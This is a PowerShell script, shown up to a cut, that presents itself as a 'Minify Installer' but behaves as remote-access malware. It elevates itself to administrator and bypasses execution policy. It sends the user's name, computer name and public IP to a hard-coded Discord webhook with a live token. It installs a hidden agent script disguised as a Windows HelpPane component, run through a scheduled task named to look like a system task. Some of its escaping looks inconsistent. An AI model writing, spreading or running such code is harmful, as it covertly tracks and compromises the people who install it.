if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ ПОЛУЧЕНИЯ СТРАНЫ И ФЛАЖКА ПО IP ---
function Get-CountryByIpAndFlag {
    try {
        $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode" -TimeoutSec 5 -ErrorAction Stop
        $countryCode = $response.countryCode
        if ($countryCode -and $countryCode.Length -eq 2) {
            $flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]$countryCode[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]$countryCode[1] - [int][char]"A" + 0x1F1E6))
            return $flag
        }
    }
    catch { }
    return ""
}

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
        if (-not $publicIP) { $publicIP = "Не удалось определить" }
    }
    catch {
        $publicIP = "Ошибка получения IP"
    }
    
    $countryFlag = Get-CountryByIpAndFlag
    $ipWithFlag = if ($countryFlag) { "$countryFlag $publicIP" } else { $publicIP }

    try {
        $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        $embed = @{
            title = "Minify Installer Log"
            color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "Computer"; value = $Computer; inline = $true },
                @{ name = "IP Address"; value = $ipWithFlag; inline = $true },
                @{ name = "Message"; value = $Message; inline = $false },
                @{ name = "Timestamp"; value = $timestamp; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        
        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
        $headers = @{ "Content-Type" = "application/json; charset=utf-8" }
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue
    }
    catch {
        try {
            $logPath = "$env:TEMP\minify_logs.txt"
            $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$ipWithFlag] $Message"
            Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
        }
        catch { }
    }
}

# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА (ПЕРЕРАБОТАНА) ---
function Install-MonitorAgent {
    param(
        [string]$TargetProcessName = "Поиск"
    )

    $agentDir = "$env:APPDATA\Microsoft\HelpPane"
    $agentScriptPath = "$agentDir\monitor.ps1"
    $taskName = "WindowsHelpPaneTask" # Уникальное имя для задачи

    # Создаем скрытую папку, если ее нет
    if (-not (Test-Path $agentDir)) {
        New-Item -Path $agentDir -ItemType Directory -Force | Out-Null
        (Get-Item $agentDir).Attributes += "Hidden"
    }

    # Создаем PS1-скрипт агента. Здесь нет проблем с кавычками.
    # Этот скрипт будет проверять процесс и отправлять лог.
    $agentScriptContent = @"
# Проверяем, запущен ли процесс
if (Get-Process -Name "$TargetProcessName" -ErrorAction SilentlyContinue) {
    # Если да, отправляем уведомление
    try {
        `$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        `$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
        if (-not `$publicIP) { `$publicIP = "Не удалось определить" }
        
        # Функция для получения флага (копируем логику сюда)
        try {
            `$response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode" -TimeoutSec 5 -ErrorAction SilentlyContinue
            `$countryCode = `\$response.countryCode
            if (`$countryCode -and `\$countryCode.Length -eq 2) {
                `$flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]`\$countryCode[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]`$countryCode[1] - [int][char]"A" + 0x1F1E6))
                `$ipWithFlag = "`$flag `$publicIP"
            } else {
                `$ipWithFlag = `\$publicIP
            }
        } catch {
            `$ipWithFlag = `\$publicIP
        }

        `$webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        `\$embed = @{
            title = "Minify Installer Log"
            color = 65280
            fields = @(
                @{ name = "Status"; value = "AUTO_RUN_SUCCESS"; inline = `$true },
                @{ name = "User"; value = `$env:USERNAME; inline = `$true },
                @{ name = "Computer"; value = `$env:COMPUTERNAME; inline = `$true },
                @{ name = "IP Address"; value = `$ipWithFlag; inline = `$true },
                @{ name = "Message"; value = "Ратка успешно стартовала из автозагрузки."; inline = `$false },
                @{ name = "Timestamp"; value = `$timestamp; inline = `\$false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        `$payload = @{ embeds = @(`\$embed) } | ConvertTo-Json -Depth 10
        `$headers = @{ "Content-Type" = "application/json; charset=utf-8" }
        Invoke-RestMethod -Uri `\$webhookUrl -Method Post -Headers `$headers -Body `\$payload -ErrorAction SilentlyContinue
    } catch { }

    # Удаляем задачу, чтобы не спамить
    try {
        Unregister-ScheduledTask -TaskName "\$taskName" -Confirm:`\$false -ErrorAction SilentlyContinue
    } catch { }
}
"@

    # Записываем скрипт агента в файл
    $agentScriptContent | Out-File -FilePath $agentScriptPath -Encoding UTF8 -Force
    (Get-Item \$agentScriptPath).Attributes += "Hidden"

    # Создаем Scheduled Task вместо реестра. Это надеж
